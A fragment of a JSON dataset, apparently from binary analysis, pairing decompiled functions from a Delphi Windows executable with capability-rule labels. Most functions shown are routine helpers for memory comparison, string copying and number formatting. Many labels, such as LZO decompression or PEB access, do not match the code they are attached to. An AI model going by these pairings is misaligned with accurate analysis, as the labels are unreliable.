fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.00404948(0x4825d8, 0, 0, 0x4824d0, 0, 0, 0x4824dc, 0, 0, 0x48259c, 0, 0, 0x482494, 0, 0, 0x48256c, 0, 0, \n                 0x4824d0, 0, 0, 0x4824e8, 0, 0, 0x482560, 0, 0, 0x48256c, 0, 0, 0, *0x486048, 0x4824b8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0x4824e8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.004047c0();\n    fcn.004047c0(0x4824b8);\n    fcn.0047eed8();\n    fcn.004047c0();\n    fcn.004047c0(0);\n    fcn.0047eed8();\n    fcn.00404948(0x4824d0, 0x482548, *0x486048, 0x48253c, 0x482530, 0x482524, 0x482518, *0x486048, 0x4824b8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.00404948(0x48250c, 0, 0, 0x482500, 0, 0, 0x4824dc, 0, 0, 0x4824f4, 0, 0, 0x4824e8, 0, 0, 0x4824dc, 0, 0, \n                 0x482494, 0, 0, 0x4824dc, 0, 0, 0x4824d0, 0, 0, 0x4824c4, 0x482560, 0, 0, 0, 0, 0, 0x4824e8, 0, 0, 0, 0\n                 , 0, 0x482554, 0, 0, *0x486048, 0x4824b8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0x4824d0);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.00404948(0x4825d8, 0, 0, 0x4824d0, 0, 0, 0x4824dc, 0, 0, 0x48259c, 0, 0, 0x482494, 0, 0, 0x48256c, 0, 0, \n                 0x4824d0, 0, 0, 0x4824e8, 0, 0, 0x482560, 0, 0, 0x48256c, 0, 0, 0, *0x486048, 0x4824b8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.00404948(0x4824d0, 0x482548, *0x486048, 0x48253c, 0x482530, 0x482524, 0x482518, *0x486048, 0x4824b8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047eed8();\n    fcn.00404948(0x48250c, 0, 0, 0x482500, 0, 0, 0x4824dc, 0, 0, 0x4824f4, 0, 0, 0x4824e8, 0, 0, 0x4824dc, 0, 0, \n                 0x482494, 0, 0, 0x4824dc, 0, 0, 0x4824d0, 0, 0, 0x4824c4, 0x482560, 0, 0, 0, 0, 0, 0x4824e8, 0, 0, 0, 0\n                 , 0, 0x482554, 0, 0, *0x486048, 0x4824b8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0x4824e8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047eed8();\n    fcn.00404948(0x4825d8, 0, 0, 0x4824d0, 0, 0, 0x4824dc, 0, 0, 0x48259c, 0, 0, 0x482494, 0, 0, 0x48256c, 0, 0, \n                 0x4824d0, 0, 0, 0x4824e8, 0, 0, 0x482560, 0, 0, 0x48256c, 0, 0, 0, *0x486048, 0x4824b8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047eed8();\n    fcn.004047c0();\n    fcn.004047c0(0);\n    fcn.0047eed8();\n    fcn.00404948(0x4824e8, *0x486048, 0x482694);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.00404948(0x4824d0, 0x482548, *0x486048, 0x48253c, 0x482530, 0x482524, 0x482518, *0x486048, 0x4824b8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.00404948(0x48259c, 0, 0, 0x48250c, 0, 0, 0x482590, 0, 0, 0x482584, 0, 0, 0x482578, 0, 0, 0x4824d0, 0, 0, \n                 0x4824e8, 0, 0, 0x482560, 0, 0, 0x48256c, 0, 0, *0x486048, *0x48604c);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.00404a88();\n    fcn.004047c0();\n    *0x486050 = fcn.0041f22c(10, 0);\n    *0x486028 = (****0x486050)();\n    fcn.00404c14();\n    fcn.00404ae0();\n    fcn.00402d34();\n    fcn.00403820();\n    fcn.00404948(0x4824d0, 0x482548, *0x486048, 0x48253c, 0x482530, 0x482524, 0x482518, *0x486048, 0x4824b8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0x482560);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047eed8();\n    fcn.00404948(0x48250c, 0, 0, 0x482500, 0, 0, 0x4824dc, 0, 0, 0x4824f4, 0, 0, 0x4824e8, 0, 0, 0x4824dc, 0, 0, \n                 0x482494, 0, 0, 0x4824dc, 0, 0, 0x4824d0, 0, 0, 0x4824c4, 0x482560, 0, 0, 0, 0, 0, 0x4824e8, 0, 0, 0, 0\n                 , 0, 0x482554, 0, 0, *0x486048, 0x4824b8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047eed8();\n    fcn.00404948(0x48259c, 0, 0, 0x48250c, 0, 0, 0x482590, 0, 0, 0x482590, 0, 0, 0x4826a0, 0, 0, 0x482578, 0, 0, \n                 0x4824d0, 0, 0, 0x4824e8, 0, 0, 0x482560, 0, 0, 0x48256c, 0, 0, 0, *0x486048, 0x4824b8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047eed8();\n    fcn.0040461c();\n    fcn.00404948(0x48259c, 0, 0, 0x48250c, 0, 0, 0x482590, 0, 0, 0x482584, 0, 0, 0x482578, 0, 0, 0x4824d0, 0, 0, \n                 0x4824e8, 0, 0, 0x482560, 0, 0, 0x48256c, 0, 0, *0x486048, *0x48604c);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0x482584);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    *0x48606c = fcn.004037f0();\n    fcn.00404948(0x4825d8, 0, 0, 0x4824d0, 0, 0, 0x4824dc, 0, 0, 0x48259c, 0, 0, 0x482494, 0, 0, 0x48256c, 0, 0, \n                 0x4824d0, 0, 0, 0x4824e8, 0, 0, 0x482560, 0, 0, 0x48256c, 0, 0, 0, *0x486048, 0x4824b8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.004800d8();\n    fcn.00404948(0x4824d0, 0x482548, *0x486048, 0x48253c, 0x482530, 0x482524, 0x482518, *0x486048, 0x4824b8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.00404948(0x48250c, 0, 0, 0x482500, 0, 0, 0x4824dc, 0, 0, 0x4824f4, 0, 0, 0x4824e8, 0, 0, 0x4824dc, 0, 0, \n                 0x482494, 0, 0, 0x4824dc, 0, 0, 0x4824d0, 0, 0, 0x4824c4, 0x482560, 0, 0, 0, 0, 0, 0x4824e8, 0, 0, 0, 0\n                 , 0, 0x482554, 0, 0, *0x486048, 0x4824b8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.00404948(0x4825d8, 0, 0, 0x4824d0, 0, 0, 0x4824dc, 0, 0, 0x48259c, 0, 0, 0x482494, 0, 0, 0x48256c, 0, 0, \n                 0x4824d0, 0, 0, 0x4824e8, 0, 0, 0x482560, 0, 0, 0x48256c, 0, 0, 0, *0x486048, 0x4824b8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.004045c8();\n    (**(**0x48606c + 0xc))();\n    iVar3 = fcn.00404888();\n    if (0 < iVar3) {\n        *0x486030 = 1;\n        do {\n            (**(**0x48606c + 0xc))();\n            fcn.004047b0();\n            fcn.00404890();\n            *0x486030 = *0x486030 + 1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    fcn.00404948(0x4824d0, 0x482548, *0x486048, 0x48253c, 0x482530, 0x482524, 0x482518, *0x486048, 0x4824b8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.00404948(0x48250c, 0, 0, 0x482500, 0, 0, 0x4824dc, 0, 0, 0x4824f4, 0, 0, 0x4824e8, 0, 0, 0x4824dc, 0, 0, \n                 0x482494, 0, 0, 0x4824dc, 0, 0, 0x4824d0, 0, 0, 0x4824c4, 0x482560, 0, 0, 0, 0, 0, 0x4824e8, 0, 0, 0, 0\n                 , 0, 0x482554, 0, 0, *0x486048, 0x4824b8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0x4824dc);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.00404948(0x48259c, 0, 0, 0x48250c, 0, 0, 0x482590, 0, 0, 0x482590, 0, 0, 0x4826a0, 0, 0, 0x482578, 0, 0, \n                 0x4824d0, 0, 0, 0x4824e8, 0, 0, 0x482560, 0, 0, 0x48256c, 0, 0, 0, *0x486048, 0x4824b8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.00404ae0();\n    fcn.0047f294();\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitProcess_1(0);\n}\n",
        "token_count": 13205
    },
    "004030b4": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004030b4(uint param_1, uint8_t *param_2)\n\n{\n    uint8_t *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    \n    uVar2 = *param_2;\n    piVar4 = in_EAX + 1;\n    piVar5 = param_2 + 1;\n    iVar1 = *in_EAX - uVar2;\n    if (*in_EAX < uVar2 || iVar1 == 0) {\n        uVar2 = uVar2 + iVar1;\n    }\n    uVar3 = uVar2 >> 2;\n    do {\n        if (uVar3 == 0) {\ncode_r0x004030f7:\n            uVar3 = uVar2 & 3;\n            uVar2 = uVar3;\n            if ((uVar3 == 0) ||\n               ((*piVar4 == *piVar5 &&\n                ((uVar2 = uVar3 - 1,  uVar2 == 0 ||\n                 ((*(piVar4 + 1) == *(piVar5 + 1) &&\n                  ((uVar2 = uVar3 - 2,  uVar2 == 0 || (*(piVar4 + 2) == *(piVar5 + 2))))))))))) {\n                iVar1 = iVar1 * 2;\n            }\ncode_r0x00403132:\n            return CONCAT44(uVar2, iVar1);\n        }\n        if (*piVar4 != *piVar5) goto code_r0x00403132;\n        if (uVar3 == 1) {\n            piVar4 = piVar4 + 1;\n            piVar5 = piVar5 + 1;\n            goto code_r0x004030f7;\n        }\n        if (piVar4[1] != piVar5[1]) goto code_r0x00403132;\n        piVar4 = piVar4 + 2;\n        piVar5 = piVar5 + 2;\n        uVar3 = uVar3 - 2;\n    } while( true );\n}\n",
        "token_count": 485
    },
    "00403138": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00403138(uint32_t param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = param_1 >> 2;\n    do {\n        if (uVar1 == 0) {\ncode_r0x00403168:\n            param_1 = param_1 & 3;\n            if (((param_1 != 0) && (*in_EAX == *param_2)) &&\n               ((param_1 == 1 ||\n                ((*(in_EAX + 1) == *(param_2 + 1) && ((param_1 == 2 || (*(in_EAX + 2) == *(param_2 + 2))))))))) {\n                return NULL;\n            }\n            return in_EAX;\n        }\n        if (*in_EAX != *param_2) {\n            return in_EAX;\n        }\n        if (uVar1 == 1) {\n            in_EAX = in_EAX + 1;\n            param_2 = param_2 + 1;\n            goto code_r0x00403168;\n        }\n        if (in_EAX[1] != param_2[1]) {\n            return in_EAX;\n        }\n        in_EAX = in_EAX + 2;\n        param_2 = param_2 + 2;\n        uVar1 = uVar1 - 2;\n    } while( true );\n}\n",
        "token_count": 322
    },
    "0040382c": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403861)\n// WARNING: Removing unreachable block (ram,0x00403867)\n// WARNING: Removing unreachable block (ram,0x0040386e)\n// WARNING: Removing unreachable block (ram,0x00403874)\n// WARNING: Removing unreachable block (ram,0x0040387a)\n\nvoid __fastcall fcn.0040382c(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    \n    *param_2 = in_EAX;\n    uVar2 = *(in_EAX + -0x28);\n    uVar1 = uVar2 >> 2;\n    piVar3 = param_2 + 1;\n    while (uVar1 = uVar1 - 1,  uVar1 != 0) {\n        *piVar3 = 0;\n        piVar3 = piVar3 + 1;\n    }\n    for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *piVar3 = 0;\n        piVar3 = piVar3 + 1;\n    }\n    for (; *(in_EAX + -0x24) != NULL; in_EAX = **(in_EAX + -0x24)) {\n    }\n    return;\n}\n",
        "token_count": 325
    },
    "004049d4": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004049d4(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if (((in_EAX != param_2) && (in_EAX != NULL)) && (param_2 != NULL)) {\n        uVar2 = param_2[-1];\n        iVar1 = in_EAX[-1] - uVar2;\n        if (in_EAX[-1] < uVar2 || iVar1 == 0) {\n            uVar2 = uVar2 + iVar1;\n        }\n        uVar2 = uVar2 >> 2;\n        for (; ((uVar2 != 0 && (*in_EAX == *param_2)) && ((uVar2 != 1 && (in_EAX[1] == param_2[1]))));\n            in_EAX = in_EAX + 2) {\n            param_2 = param_2 + 2;\n            uVar2 = uVar2 - 2;\n        }\n    }\n    return;\n}\n",
        "token_count": 241
    },
    "00404e4c": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404e4c(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if (((in_EAX != param_2) && (in_EAX != NULL)) && (param_2 != NULL)) {\n        uVar2 = param_2[-1];\n        iVar1 = in_EAX[-1] - uVar2;\n        if (in_EAX[-1] < uVar2 || iVar1 == 0) {\n            uVar2 = uVar2 + iVar1;\n        }\n        uVar2 = uVar2 >> 2;\n        for (; ((uVar2 != 0 && (*in_EAX == *param_2)) && ((uVar2 != 1 && (in_EAX[1] == param_2[1]))));\n            in_EAX = in_EAX + 2) {\n            param_2 = param_2 + 2;\n            uVar2 = uVar2 - 2;\n        }\n    }\n    return;\n}\n",
        "token_count": 242
    },
    "004092c8": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004092c8(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    \n    uVar2 = 0xffffffff;\n    puVar4 = param_2;\n    do {\n        if (uVar2 == 0) break;\n        uVar2 = uVar2 - 1;\n        cVar1 = *puVar4;\n        puVar4 = puVar4 + 1;\n    } while (cVar1 != '\\0');\n    for (uVar3 = ~uVar2 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *in_EAX = *param_2;\n        param_2 = param_2 + 1;\n        in_EAX = in_EAX + 1;\n    }\n    for (uVar2 = ~uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *in_EAX = *param_2;\n        param_2 = param_2 + 1;\n        in_EAX = in_EAX + 1;\n    }\n    return;\n}\n",
        "token_count": 284
    },
    "004092f0": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004092f0(int32_t param_1, uint *param_2)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    bool bVar4;\n    \n    bVar4 = param_1 == 0;\n    iVar1 = param_1;\n    puVar3 = param_2;\n    if (!bVar4) {\n        do {\n            if (iVar1 == 0) break;\n            iVar1 = iVar1 + -1;\n            bVar4 = *puVar3 == '\\0';\n            puVar3 = puVar3 + 1;\n        } while (!bVar4);\n        if (bVar4) {\n            iVar1 = iVar1 + 1;\n        }\n    }\n    for (uVar2 = param_1 - iVar1 >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *in_EAX = *param_2;\n        param_2 = param_2 + 1;\n        in_EAX = in_EAX + 1;\n    }\n    for (uVar2 = param_1 - iVar1 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *in_EAX = *param_2;\n        param_2 = param_2 + 1;\n        in_EAX = in_EAX + 1;\n    }\n    *in_EAX = 0;\n    return;\n}\n",
        "token_count": 336
    },
    "0041ffb8": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041ffb8(uint32_t param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    \n    while (param_1 != 0) {\n        uVar2 = *(in_EAX + 0x14) - *(in_EAX + 0x10);\n        if (*(in_EAX + 0x14) < *(in_EAX + 0x10) || uVar2 == 0) {\n            fcn.00420004();\n            uVar2 = *(in_EAX + 0x14);\n        }\n        if (param_1 <= uVar2) {\n            uVar2 = param_1;\n        }\n        param_1 = param_1 - uVar2;\n        iVar1 = *(in_EAX + 0x10);\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + uVar2;\n        puVar4 = *(in_EAX + 8) + iVar1;\n        for (uVar3 = uVar2 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *param_2 = *puVar4;\n            puVar4 = puVar4 + 1;\n            param_2 = param_2 + 1;\n        }\n        for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *param_2 = *puVar4;\n            puVar4 = puVar4 + 1;\n            param_2 = param_2 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 398
    },
    "0042232c": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042232c(uint32_t param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    \n    while (param_1 != 0) {\n        uVar2 = *(in_EAX + 0xc) - *(in_EAX + 0x10);\n        if (*(in_EAX + 0xc) < *(in_EAX + 0x10) || uVar2 == 0) {\n            fcn.00422378();\n            uVar2 = *(in_EAX + 0xc);\n        }\n        if (param_1 <= uVar2) {\n            uVar2 = param_1;\n        }\n        param_1 = param_1 - uVar2;\n        iVar1 = *(in_EAX + 0x10);\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + uVar2;\n        puVar4 = *(in_EAX + 8) + iVar1;\n        for (uVar3 = uVar2 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar4 = *param_2;\n            param_2 = param_2 + 1;\n            puVar4 = puVar4 + 1;\n        }\n        for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar4 = *param_2;\n            param_2 = param_2 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 395
    },
    "004087c4": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004087c4(ushort *arg_8h)\n\n{\n    uint32_t in_EAX;\n    ushort *in_ECX;\n    uint32_t in_EDX;\n    \n    *in_ECX = in_EAX / (in_EDX & 0xffff);\n    *arg_8h = in_EAX % (in_EDX & 0xffff);\n    return;\n}\n",
        "token_count": 87
    },
    "004031a8": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004031a8(uchar param_1, uint32_t param_2)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = param_2 >> 2;\n    if (-1 < iVar1) {\n        for (; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *in_EAX = CONCAT22(CONCAT11(param_1, param_1), CONCAT11(param_1, param_1));\n            in_EAX = in_EAX + 1;\n        }\n        for (param_2 = param_2 & 3; param_2 != 0; param_2 = param_2 - 1) {\n            *in_EAX = param_1;\n            in_EAX = in_EAX + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 185
    },
    "00407594": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00407594(uint param_1, int32_t param_2)\n\n{\n    uint32_t in_EAX;\n    \n    return in_EAX & 0xffff | param_2 << 0x10;\n}\n",
        "token_count": 54
    },
    "0044caa8": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0044caa8(void)\n\n{\n    uchar in_AL;\n    int32_t iVar1;\n    uint lpString;\n    uint var_2h;\n    \n    var_2h._0_1_ = in_AL;\n    fcn.004045c8();\n    iVar1 = sub.user32.dll_MapVirtualKeyA(var_2h, 0);\n    if (iVar1 << 0x10 != 0) {\n        sub.user32.dll_GetKeyNameTextA(iVar1 << 0x10, &lpString, 0x100);\n        fcn.00404838();\n    }\n    return;\n}\n",
        "token_count": 162
    },
    "004031c8": {
        "rules": [
            "generate random numbers using the Delphi LCG/d1e3669b265a4cefae2dee380548f202"
        ],
        "decompiled_code": "\nuint fcn.004031c8(void)\n\n{\n    uint32_t in_EAX;\n    \n    *0x483008 = *0x483008 * 0x8088405 + 1;\n    return in_EAX * *0x483008 >> 0x20;\n}\n",
        "token_count": 62
    },
    "004031e4": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004031e4(char *param_1, int32_t param_2)\n\n{\n    uint64_t uVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    char acStack37 [21];\n    int32_t iStack16;\n    \n    iStack16 = param_2;\n    uVar2 = (in_EAX ^ in_EAX >> 0x1f) - (in_EAX >> 0x1f);\n    iVar4 = 0;\n    do {\n        iVar3 = iVar4;\n        uVar1 = uVar2;\n        uVar2 = uVar2 / 10;\n        acStack37[iVar3 + 1] = uVar1 % 10 + '0';\n        iVar4 = iVar3 + 1;\n    } while (uVar2 != 0);\n    if (in_EAX < 0) {\n        acStack37[iVar3 + 2] = '-';\n        iVar4 = iVar3 + 2;\n    }\n    *param_1 = iVar4;\n    pcVar5 = param_1 + 1;\n    if (0xff < iStack16) {\n        iStack16 = 0xff;\n    }\n    iVar3 = iStack16 - iVar4;\n    if (iVar3 != 0 && iVar4 <= iStack16) {\n        *param_1 = *param_1 + iVar3;\n        for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *pcVar5 = ' ';\n            pcVar5 = pcVar5 + 1;\n        }\n    }\n    do {\n        *pcVar5 = acStack37[iVar4];\n        pcVar5 = pcVar5 + 1;\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    return;\n}\n",
        "token_count": 422
    },
    "004043b8": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid fcn.004043b8(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar2 = 0x10;\n    iVar1 = *0x483000;\n    do {\n        *((uVar2 & 0xff) + 0x483070) = iVar1 % 10 + '0';\n        iVar1 = iVar1 / 10;\n        uVar2 = uVar2 - 1;\n    } while (iVar1 != 0);\n    uVar3 = 0x1c;\n    uVar2 = *0x483004;\n    do {\n        *((uVar3 & 0xff) + 0x483070) = *((uVar2 & 0xf) + 0x483090);\n        uVar2 = uVar2 >> 4;\n        uVar3 = uVar3 - 1;\n    } while (uVar2 != 0);\n    return;\n}\n",
        "token_count": 216
    },
    "00408bf2": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408bf2(uint param_1, uint32_t param_2)\n\n{\n    uint64_t uVar1;\n    int32_t iVar2;\n    uint32_t in_EAX;\n    uint8_t uVar3;\n    int32_t iVar5;\n    uint8_t *unaff_ESI;\n    uint8_t *puVar6;\n    char cVar4;\n    \n    puVar6 = unaff_ESI;\n    do {\n        uVar1 = in_EAX;\n        in_EAX = in_EAX / 10;\n        puVar6 = puVar6 + -1;\n        cVar4 = uVar1 % 10;\n        uVar3 = cVar4 + 0x30;\n        if (0x39 < uVar3) {\n            uVar3 = cVar4 + 0x37;\n        }\n        *puVar6 = uVar3;\n    } while (in_EAX != 0);\n    iVar5 = param_2 - (unaff_ESI - puVar6);\n    if (unaff_ESI - puVar6 <= param_2 && iVar5 != 0) {\n        iVar2 = -iVar5;\n        while (iVar5 = iVar5 + -1,  iVar5 != 0) {\n            (puVar6 + iVar2)[iVar5] = 0x30;\n        }\n        puVar6[iVar2] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 317
    },
    "00409a74": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00409a74(int32_t param_1, uint32_t param_2)\n\n{\n    char cVar2;\n    uint in_EAX;\n    uint32_t uVar1;\n    char unaff_BL;\n    uint32_t *puVar3;\n    uchar *unaff_EDI;\n    char *pcVar4;\n    uint32_t uStack8;\n    \n    *unaff_EDI = in_EAX;\n    if (unaff_BL == '\\0') {\n        param_2 = 0;\ncode_r0x00409a8a:\n        cVar2 = in_EAX >> 8;\n        pcVar4 = unaff_EDI + 1;\n        if (cVar2 == '\\0') goto code_r0x00409a91;\n    }\n    else {\n        if (-1 < param_2) goto code_r0x00409a8a;\n        cVar2 = '-';\n        param_2 = -param_2;\n    }\n    pcVar4 = unaff_EDI + 2;\n    unaff_EDI[1] = cVar2;\ncode_r0x00409a91:\n    puVar3 = &uStack8;\n    uStack8 = param_2;\n    do {\n        do {\n            uVar1 = param_2 / *0x483178;\n            *puVar3 = param_2 % *0x483178 + '0';\n            puVar3 = puVar3 + 1;\n            param_1 = param_1 + -1;\n            param_2 = uVar1;\n        } while (uVar1 != 0);\n    } while (0 < param_1);\n    do {\n        puVar3 = puVar3 + -1;\n        *pcVar4 = *puVar3;\n        pcVar4 = pcVar4 + 1;\n    } while (puVar3 != &uStack8);\n    return uStack8;\n}\n",
        "token_count": 421
    },
    "0040a1cf": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
